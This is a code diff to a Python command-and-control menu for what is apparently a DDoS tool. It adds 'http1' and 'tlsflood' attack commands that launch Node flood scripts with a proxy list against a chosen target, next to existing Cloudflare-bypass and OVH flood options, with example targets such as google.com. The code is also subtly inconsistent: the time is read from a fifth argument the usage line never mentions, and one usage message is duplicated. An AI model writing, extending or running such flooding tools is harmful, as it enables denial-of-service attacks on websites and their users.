@@ -178,6 +178,7 @@ def layer7():
                \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mcf-bypass           \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mslow              \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255muambypass           \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttps-spoof       \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255movh-raw             \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255movh-beam          \x1b[38;2;0;212;14m║
+               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttp1               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mtlsflood          \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╚═══════════════════════╩═════════════════════╝
 ''')
 
@@ -463,6 +464,24 @@ def main():
             except IndexError:
                 print('Usage: ovh-beam <GET/HEAD/POST/PUT> <ip> <port> <time>')
                 print('Example: ovh-beam GET 51.38.92.223 80 60')
+
+        elif "http1" in cnc:
+            try:
+                ip = cnc.split()[1]
+                time = cnc.split()[4] 
+                os.system(f'node http1.js GET {ip} proxies.txt {time} 64 2')
+            except IndexError:
+                print('Usage: http1 <target> <time>')
+                print('Example: http1 https://google.com 60')
+
+        elif "tlsflood" in cnc:
+            try:
+                ip = cnc.split()[1]
+                time = cnc.split()[4] 
+                os.system(f'node tls.js {ip} {time}')
+            except IndexError:
+                print('Usage: http1 <target> <time>')
+                print('Example: http1 https://google.com 60')
     
         elif "https-spoof" in cnc:
             try:
